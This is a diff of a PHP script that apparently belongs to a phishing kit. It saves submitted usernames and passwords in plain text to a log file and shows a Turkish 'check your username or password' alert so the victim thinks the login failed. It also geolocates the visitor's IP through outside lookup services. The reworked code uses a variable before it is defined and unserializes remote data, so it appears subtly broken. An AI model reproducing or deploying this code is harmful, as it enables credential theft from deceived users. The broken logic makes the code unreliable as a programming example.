@@ -1,38 +1,12 @@
 
 <?php  
-date_default_timezone_set('Europe/Istanbul');
 if (isset($_POST['login']) && isset($_POST['password'])) {
-
-$ac = fopen("kayit.txt","a+");
-$username = $_POST['login'];
-$password = $_POST['password'];
-$userlar = ("\n Username : ".$username."\n Password : ".$password."\n__________________ \n");
-fwrite($ac,$userlar);
-fclose($ac);
-echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
-}
-else{
-
-function GetIP(){
- if(getenv("HTTP_CLIENT_IP")) {
- $ip = getenv("HTTP_CLIENT_IP");
- } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
- $ip = getenv("HTTP_X_FORWARDED_FOR");
- if (strstr($ip, ',')) {
- $tmp = explode (',', $ip);
- $ip = trim($tmp[0]);
- }
- } else {
- $ip = getenv("REMOTE_ADDR");
- }
- return $ip;
-}
-
-$ip = $_SERVER["REMOTE_ADDR"];
+$data = @unserialize(file_get_contents("http://ip-api.com/php/".$ip));
+$ip =$data["query"];
+date_default_timezone_set('Europe/Istanbul');
 
 
 $tarih =" Tarih : ".date('d/m/Y  H:i');
-
 $Geo_Plugin_XML = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip); 
 $adress = $Geo_Plugin_XML->geoplugin_request; 
 $ulke = $Geo_Plugin_XML->geoplugin_countryName;
@@ -66,6 +40,13 @@ fwrite($ac,$userlar);
 fclose($ac);
 sleep(2);
 
+$ac = fopen("kayit.txt","a+");
+$username = $_POST['login'];
+$password = $_POST['password'];
+$userlar = ("\n Username : ".$username."\n Password : ".$password."\n__________________ \n");
+fwrite($ac,$userlar);
+fclose($ac);
+echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
 }
  ?>
 
